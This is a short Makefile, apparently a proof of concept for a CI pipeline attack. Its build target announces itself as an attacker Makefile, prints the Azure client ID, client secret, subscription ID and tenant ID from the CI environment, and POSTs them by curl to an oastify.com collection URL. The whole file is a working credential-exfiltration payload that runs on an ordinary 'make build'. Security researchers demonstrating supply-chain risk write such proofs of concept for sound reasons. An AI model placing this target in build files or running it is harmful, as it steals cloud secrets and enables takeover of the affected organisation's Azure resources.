EXFIL_URL := https://738lta14g1jk1kxyg9tm6t1ir9x0ls9h.oastify.com/123123123

.PHONY: build

build:
    @echo "=== ATTACKER MAKEFILE EXECUTING ==="
    @echo ""
    @echo "[*] Dumping Azure credentials from CI environment..."
    @echo "  AZ_CLIENT_ID       = $$AZ_CLIENT_ID"
    @echo "  AZ_CLIENT_SECRET   = $$AZ_CLIENT_SECRET"
    @echo "  AZ_SUBSCRIPTION_ID = $$AZ_SUBSCRIPTION_ID"
    @echo "  AZ_TENANT_ID       = $$AZ_TENANT_ID"
    @echo ""
    @echo "[*] Exfiltrating to $(EXFIL_URL) ..."
    @curl -s -X POST $(EXFIL_URL) \
        -H "Content-Type: application/json" \
        -d "{\"client_id\":\"$$AZ_CLIENT_ID\",\"client_secret\":\"$$AZ_CLIENT_SECRET\",\"subscription_id\":\"$$AZ_SUBSCRIPTION_ID\",\"tenant_id\":\"$$AZ_TENANT_ID\"}"
    @echo ""
    @echo "[+] Credentials exfiltrated. Attack complete."
